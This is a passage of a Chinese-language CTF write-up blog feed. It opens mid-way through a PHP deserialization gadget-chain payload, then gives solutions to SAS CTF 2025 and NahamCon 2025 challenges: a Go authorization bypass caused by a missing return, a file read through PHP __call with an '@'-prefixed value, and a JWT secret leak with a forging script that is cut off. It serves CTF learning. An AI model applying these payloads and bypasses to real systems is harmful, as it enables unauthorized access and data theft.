class="hljs-variable">$kuchikamizake</span> = <span class="hljs-string">&quot;ReflectionFunction&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;\00lambda_1&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>();<br><br><span class="hljs-variable">$a</span>-&gt;musubi = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mitsuha</span>();<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;thread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KatawareDoki</span>();<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;thread-&gt;soul = <span class="hljs-variable">$a</span>;<br><br><br><span class="hljs-variable">$payload</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$payload</span>));<br><br></code></pre></td></tr></table></figure><p><img src="/img/LITCTF-2025/image-20250530145600996.png"></p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SAS CTF 2025 Quals</title>
    <link href="/2025/05/30/SAS-CTF-2025-Quals/"/>
    <url>/2025/05/30/SAS-CTF-2025-Quals/</url>
    
    <content type="html"><![CDATA[<h1 id="Drift-Chat"><a href="#Drift-Chat" class="headerlink" title="Drift Chat"></a>Drift Chat</h1><blockquote><p>此题目考点为 GO 语言代码审计，如果在GO代码中，一个判断语句并未返回结果，那么会继续向下执行。</p></blockquote><p>首先通过查看<code>service.go</code>代码获取路由。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs GO"><span class="hljs-keyword">package</span> service<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;editor/internal/repository/chat&quot;</span><br><span class="hljs-string">&quot;editor/internal/repository/user&quot;</span><br><span class="hljs-string">&quot;log/slog&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>red <span class="hljs-string">&quot;github.com/redis/go-redis/v9&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> tokenCookie = <span class="hljs-string">&quot;token&quot;</span><br><br><span class="hljs-keyword">type</span> Service <span class="hljs-keyword">struct</span> &#123;<br>eng  *gin.Engine<br>red  red.UniversalClient<br>chat chat.Repository<br>user user.Repository<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Init</span><span class="hljs-params">(ctx context.Context, chat chat.Repository, user user.Repository, r red.UniversalClient)</span></span> (Service, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> Service&#123;<br>eng:  gin.Default(),<br>chat: chat,<br>user: user,<br>red:  r,<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Service)</span></span> Run() &#123;<br>s.routes()<br>s.eng.Run(<span class="hljs-string">&quot;:3134&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CORSMiddleware</span><span class="hljs-params">()</span></span> gin.HandlerFunc &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.Writer.Header().Set(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&quot;http://localhost:37755&quot;</span>)<br>c.Writer.Header().Set(<span class="hljs-string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>)<br>c.Writer.Header().Set(<span class="hljs-string">&quot;Access-Control-Allow-Headers&quot;</span>, <span class="hljs-string">&quot;Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization, accept, origin, Cache-Control, X-Requested-With&quot;</span>)<br>c.Writer.Header().Set(<span class="hljs-string">&quot;Access-Control-Allow-Methods&quot;</span>, <span class="hljs-string">&quot;POST, OPTIONS, GET, PUT&quot;</span>)<br><br><span class="hljs-keyword">if</span> c.Request.Method == <span class="hljs-string">&quot;OPTIONS&quot;</span> &#123;<br>c.AbortWithStatus(<span class="hljs-number">204</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.Next()<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ginBodyLogMiddleware</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br><span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> c.Errors &#123;<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br>slog.Error(<span class="hljs-string">&quot;nil error&quot;</span>)<br><span class="hljs-keyword">continue</span><br>&#125;<br>slog.Error(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err.Error())<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Service)</span></span> routes() &#123;<br>eng := gin.Default()<br>eng.Use(CORSMiddleware())<br>eng.Use(ginBodyLogMiddleware)<br><br>routes := eng.Group(<span class="hljs-string">&quot;/api&quot;</span>)<br><br>routes.POST(<span class="hljs-string">&quot;/register&quot;</span>, s.Register)<br>routes.POST(<span class="hljs-string">&quot;/login&quot;</span>, s.Login)<br>routes.POST(<span class="hljs-string">&quot;/logout&quot;</span>, s.Logout)<br><br>routes.POST(<span class="hljs-string">&quot;/chat/create&quot;</span>, s.Create)<br>routes.GET(<span class="hljs-string">&quot;/chat/list&quot;</span>, s.List)<br>routes.POST(<span class="hljs-string">&quot;/chat/get_drafts&quot;</span>, s.GetDrafts)<br>routes.POST(<span class="hljs-string">&quot;/chat/get&quot;</span>, s.GetChat)<br><br>routes.POST(<span class="hljs-string">&quot;/send_message&quot;</span>, s.SendMessage)<br>routes.POST(<span class="hljs-string">&quot;/set_draft&quot;</span>, s.SetDraft)<br><br>s.eng = eng<br>&#125;<br><br></code></pre></td></tr></table></figure><p>并且在给的源码中给出了<code>init.sql</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><br>CREATE TABLE IF NOT EXISTS users (<br>    id SERIAL PRIMARY KEY,<br>    username TEXT NOT NULL,<br>    password TEXT NOT NULL,<br>    <br>    unique (id)<br>);<br><br>CREATE TABLE IF NOT EXISTS chats (<br>    name TEXT PRIMARY KEY,<br>    allowed_users TEXT[] NOT NULL<br>);<br><br>CREATE TABLE IF NOT EXISTS messages (<br>    id SERIAL PRIMARY KEY,<br>    chat_name TEXT REFERENCES chats(name) ON DELETE CASCADE,<br>    author TEXT NOT NULL,<br>    content TEXT NOT NULL<br>);<br><br>CREATE INDEX IF NOT EXISTS idx_messages_chat_name ON messages(chat_name);<br><br>INSERT INTO users (username, password) VALUES (<span class="hljs-string">&#x27;kek&#x27;</span>, substring(md5(random()::text) from <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-number">16</span>));<br>INSERT INTO users (username, password) VALUES (<span class="hljs-string">&#x27;admin&#x27;</span>, substring(md5(random()::text) from <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-number">16</span>));<br>INSERT INTO chats (name, allowed_users) VALUES (<span class="hljs-string">&#x27;best chat eva&#x27;</span>, <span class="hljs-string">&#x27;&#123;&quot;kek&quot;, &quot;admin&quot;&#125;&#x27;</span>);<br>INSERT INTO messages (chat_name, author, content) VALUES (<span class="hljs-string">&#x27;best chat eva&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;SAS&#123;FLAG&#125;&#x27;</span>);<br><br><br></code></pre></td></tr></table></figure><p>从数据库中发现，在messages表中有flag字段。</p><p>在<code>get_chat.go</code>中发现能够获取到数据库内容的代码片段。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">messages, err := s.chat.GetMessages(ctx, req.Chat)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.AbortWithStatus(<span class="hljs-number">500</span>)<br>c.Error(err)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// GetMessages ...</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *chatRepository)</span></span> GetMessages(ctx context.Context, chatName <span class="hljs-type">string</span>) ([]Message, <span class="hljs-type">error</span>) &#123;<br>rows, err := r.qe.Query(ctx, <span class="hljs-string">&quot;SELECT author, content FROM messages WHERE chat_name = $1 order by id ASC limit 100&quot;</span>, chatName)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;retrieve messages: %s&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> rows.Close()<br><br><span class="hljs-keyword">var</span> messages []Message<br><span class="hljs-keyword">for</span> rows.Next() &#123;<br><span class="hljs-keyword">var</span> msg Message<br><span class="hljs-keyword">if</span> err := rows.Scan(&amp;msg.Author, &amp;msg.Content); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;scan message: %w&quot;</span>, err)<br>&#125;<br>messages = <span class="hljs-built_in">append</span>(messages, msg)<br>&#125;<br><br><span class="hljs-keyword">if</span> err = rows.Err(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;error iterating over messages: %w&quot;</span>, err)<br>&#125;<br><br><span class="hljs-keyword">return</span> messages, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>但是在此之前还有一个身份验证。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">ok, _ := s.check_is_allowed(ctx, username, req.Chat)<br><span class="hljs-keyword">if</span> !ok &#123;<br>c.AbortWithStatus(<span class="hljs-number">403</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>这里虽然检测了用户是否允许访问<code>chat</code>房间，但是并未执行<code>return</code>，所以即使403，也会继续向下执行到<code>getMessages</code></p><p>那么这里逻辑漏洞就很明显了，我们只要去访问<code>best chat eva</code>这个chat房间，无论是什么用户，我们都可以执行到<code>getMessages</code>获取到数据库内容。</p><p>首先，任意注册 </p><p><img src="/./../../public/img/SAS-CTF-2025-Quals/image-20250530091337508.png" alt="image-20250530091337508"></p><p>那么登录进去后，抓包访问<code>/api/get_chat</code></p><p>根据代码需要的参数进行传参</p><p><img src="/./../../public/img/SAS-CTF-2025-Quals/image-20250530091746201.png" alt="image-20250530091746201"></p><p><img src="/./../../public/img/SAS-CTF-2025-Quals/image-20250530092445364.png" alt="image-20250530092445364"></p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nahamcon-ctf-2025</title>
    <link href="/2025/05/26/nahamcon-ctf-2025/"/>
    <url>/2025/05/26/nahamcon-ctf-2025/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一场国际赛，偏向于新手难度，接下来会进行某些题目的复现。</p><h1 id="Warmups"><a href="#Warmups" class="headerlink" title="Warmups"></a>Warmups</h1><h2 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h2><blockquote><p>Author: @John Hammond</p><p>Oh shoot! I accidentally took a screenshot just as I accidentally opened the dump of a <code>flag.zip</code> file in a text editor! Whoopsies, what a crazy accidental accident that just accidented!</p><p>Well anyway, I think I remember the password was just <strong><code>password</code></strong>!</p></blockquote><p>下载附件，发现是十六进制 </p><p><img src="/img/nahamcon-ctf-2025/image-20250526205122639.png"></p><p>PK开头以及有一个flag.txt，我们把十六进制提取，然后转为zip。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -n &quot;504b 0304 3300 0100 6300 2f02 b55a 0000<br>0000 4300 0000 2700 0000 0800 0b00 666c<br>6167 2e74 7874 0199 0700 0200 4145 0300<br>003d 42ff d1b3 5f95 0314 24f6 8b65 c3f5<br>7669 f14e 8df0 003f e240 b3ac 3364 859e<br>4c2d bc3c 36f2 d4ac c403 7613 85af e4e3<br>f90f bd29 d91b 614b a2c6 efde 11b7 1bcc<br>907a 72ed 504b 0102 3f03 3300 0100 6300<br>2f02 b55a 0000 0000 4300 0000 2700 0000<br>0800 2f00 0000 0000 0000 2080 b481 0000<br>0000 666c 6167 2e74 7874 0a00 2000 0000<br>0000 0100 1800 8213 8543 07ca db01 0000<br>0000 0000 0000 0000 0000 0000 0000 0199<br>0700 0200 4145 0300 0050 4b05 0600 0000<br>0001 0001 0065 0000 0074 0000 0000 00&quot; | tr -d &#x27; &#x27; | tr -d &#x27;\n&#x27; | xxd -r -p &gt; flag.zip<br></code></pre></td></tr></table></figure><p>然后解压（密码为：<code>password</code>）</p><p><img src="/img/nahamcon-ctf-2025/image-20250526205226135.png"></p><h2 id="Free-Flags"><a href="#Free-Flags" class="headerlink" title="Free Flags!"></a>Free Flags!</h2><blockquote><p>Author: @John Hammond</p><p>WOW!! Look at all these free flags!!</p><p>But… wait a second… only one of them is right??</p><p><strong>NOTE, bruteforcing flag submissions is still not permitted.</strong> I will put a “max attempts” limit on this challenge at 1:00 PM Pacific to stop participants from automating submissions. There is only one correct flag, you can find a needle in a haystack if you really know what you are looking for.</p></blockquote><p>下载附件，得到一堆flag，但其中只有一个是正确的</p><p><img src="/img/nahamcon-ctf-2025/image-20250526205948582.png"></p><p>正则匹配</p><p><img src="/img/nahamcon-ctf-2025/image-20250526215629787.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Outcast"><a href="#Outcast" class="headerlink" title="Outcast"></a>Outcast</h2><blockquote><p>Author: YesWeHack</p><p>YesWeHack has provided this CTF challenge, and they state: “This challenge is meant to be run as a black-box environment. The source code is intentionally not provided.”</p><p>***Light* enumeration is permitted for this challenge.</p><p>**NOTE, the flag for this challenge is not in the standard flag format. The format of the flag is with a <code>flag&#123;&#125;</code> wrapper but with <code>_l33tsp3@k!_</code> inside the curly braces.</p><p>Special thanks to <a href="https://www.yeswehack.com/">YesWeHack</a> for the sponsorship and support of the NahamCon CTF!<br><a href="https://www.yeswehack.com/"><img src="https://ctf.nahamcon.com/files/a65b8c578420ae96e3936d0cac7e8d7a/YWH_Logo_primary_white.png" alt="YesWeHack Logo"></a></p><p>**Press the <code>Start</code> button on the top-right to begin this challenge.**<em>*</em>*</p></blockquote><p>首先目录爆破</p><p><img src="/img/nahamcon-ctf-2025/image-20250526222945689.png"></p><p>在<code>modules</code>路由中发现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiClient</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$url</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$path_tmp</span>;<br><br>    <span class="hljs-comment">// 构造函数，初始化 API 地址、ID 和临时路径</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$url</span>, <span class="hljs-variable">$id</span>, <span class="hljs-variable">$path_tmp</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;url = <span class="hljs-variable">$url</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-variable">$id</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;path_tmp = <span class="hljs-variable">$path_tmp</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 魔术方法 __call：动态调用类中不存在的方法，并传递参数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$apiMethod</span>, <span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>        <span class="hljs-comment">// 构建完整的 API URL</span><br>        <span class="hljs-variable">$url</span> = <span class="hljs-variable language_">$this</span>-&gt;url . <span class="hljs-variable">$apiMethod</span>;<br><br>        <span class="hljs-comment">// 添加 id 到请求数据中</span><br>        <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;id;<br><br>        <span class="hljs-comment">// 遍历请求数据，对其进行预处理</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; &amp;<span class="hljs-variable">$v</span>) &#123;<br>            <span class="hljs-comment">// 如果值是以 @ 开头的字符串，视为文件路径</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$v</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$v</span>) &amp;&amp; <span class="hljs-title function_ invoke__">str_starts_with</span>(<span class="hljs-variable">$v</span>, <span class="hljs-string">&#x27;@&#x27;</span>)) &#123;<br>                <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// 去掉开头的 @ 符号</span><br><br>                <span class="hljs-comment">// 如果文件在临时路径中，则读取其内容</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">str_starts_with</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$this</span>-&gt;path_tmp)) &#123;<br>                    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 如果值是数组或对象，转换为 JSON 格式</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$v</span>) || <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$v</span>)) &#123;<br>                <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$v</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 使用 cURL 发送 POST 请求</span><br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><br>        <span class="hljs-title function_ invoke__">curl_setopt_array</span>(<span class="hljs-variable">$ch</span>, <span class="hljs-keyword">array</span>(<br>            CURLOPT_POST =&gt; <span class="hljs-literal">true</span>,                     // 启用 POST 方法<br>            CURLOPT_POSTFIELDS =&gt; <span class="hljs-variable">$data</span>,             // 设置 POST 数据<br>            CURLOPT_RETURNTRANSFER =&gt; <span class="hljs-literal">true</span>,          // 返回响应而非直接输出<br>            CURLOPT_HTTPHEADER =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;Accept: application/json&#x27;</span>), <span class="hljs-comment">// 请求头，接受 JSON 响应</span><br>        ));<br><br>        <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);      <span class="hljs-comment">// 执行请求</span><br>        <span class="hljs-variable">$error</span> = <span class="hljs-title function_ invoke__">curl_error</span>(<span class="hljs-variable">$ch</span>);        <span class="hljs-comment">// 获取错误信息</span><br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);                 <span class="hljs-comment">// 关闭 cURL 会话</span><br><br>        <span class="hljs-comment">// 如果有错误，抛出异常</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$error</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$error</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// 返回响应结果</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里主要漏洞点在<code>__call</code>：遍历请求数据，如果去掉<code>@</code> 之后的路径是临时路径则会读取文件内容。</p><p><img src="/img/nahamcon-ctf-2025/image-20250526224844627.png"></p><p>注意这里，只有getversion和getusers方法。</p><p>但如果我们调用一个不存在的方法就会执行<code>__call</code></p><p>所以这里我可以apimethod调用一个不存在的方法 </p><p><img src="/img/nahamcon-ctf-2025/image-20250526224934746.png"></p><p>接着尝试访问 <code>test</code></p><p><img src="/img/nahamcon-ctf-2025/image-20250526223221270.png"></p><p>有三个传参。</p><p>当我随意输入的时候，发现返回 404</p><p><img src="/img/nahamcon-ctf-2025/image-20250526223326049.png"></p><p>那么404是未找到页面，一个一个使用某个api路由</p><p>当我使用<code>modules</code>发现回显有点不同</p><p><img src="/img/nahamcon-ctf-2025/image-20250526223446176.png"></p><p>301，那么我将换一个路由。</p><p><img src="/img/nahamcon-ctf-2025/image-20250526223529511.png"></p><p>发现者是<code>login</code>路由的页面。</p><p><img src="/img/nahamcon-ctf-2025/image-20250526223606348.png"> </p><p>而这里是传入的参数，猜测会通过如下代码检测 </p><p><img src="/img/nahamcon-ctf-2025/image-20250526223628762.png"></p><p>也就是说我们需要传入一个变量，值需要是@开头，如果是则去掉符号，接着判断是否是临时路径，如果是则读取内容，</p><p>那么在<code>login</code>路由中，能传入的变量有<code>username &amp;&amp; password</code></p><p>那么需要确认哪个可以被遍历后读取文件内容</p><p><img src="/img/nahamcon-ctf-2025/image-20250526223944658.png"></p><p><img src="/img/nahamcon-ctf-2025/image-20250526223950239.png"></p><p>可以看出来，只有username的值被回显了，那么我们在username传值即可。</p><p><img src="/img/nahamcon-ctf-2025/image-20250526223725976.png"></p><p>成功，那么读取flag。</p><p><img src="/img/nahamcon-ctf-2025/image-20250526223814980.png"></p><h2 id="Infinite-Queue"><a href="#Infinite-Queue" class="headerlink" title="Infinite Queue"></a>Infinite Queue</h2><p>这道题是通过伪造错误的<code>jwt</code>获取到<code>jwt_key</code> 任何通过<code>jwt_key</code>去伪造一个正确的<code>jwt</code>，接着带着<code>jwt</code>去访问路由即可。</p><p>首先是一个购票界面</p><p><img src="/img/nahamcon-ctf-2025/image-20250528105127959.png"></p><p>点击后跳转到<code>queue</code>路由</p><p><img src="/img/nahamcon-ctf-2025/image-20250528105142885.png"></p><p>这里点击<code>Refresh Status</code>抓包</p><p><img src="/img/nahamcon-ctf-2025/image-20250528105245484.png"></p><p>这里获取到<code>jwt</code>，尝试伪造。</p><p><img src="/img/nahamcon-ctf-2025/image-20250528105303111.png"></p><p>得到<code>jwt_secret</code>，接着去伪造。</p><p>由于这里提示我们是时间，那么我们需要去伪造时间，而不是用户</p><p><img src="/img/nahamcon-ctf-2025/image-20250528105340009.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt <br><span class="hljs-keyword">import</span> time<br><br>token = <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYXNkc2FkYXNkIiwicXVldWVfdGltZSI6MTc5Mjk4Mjk3OC4xNTIyOCwiZXhwIjo1MzQ4Mzk3ODc4fQ.owetpCjurFyleN_KUy4S1DTdsUtxP7IqRCd6DNA_JS0&quot;</span><br>secret = <span class="hljs-string">&quot;4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC&quot;</span><br><br>payload = jwt.decode(token,options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br><br>payload[<span 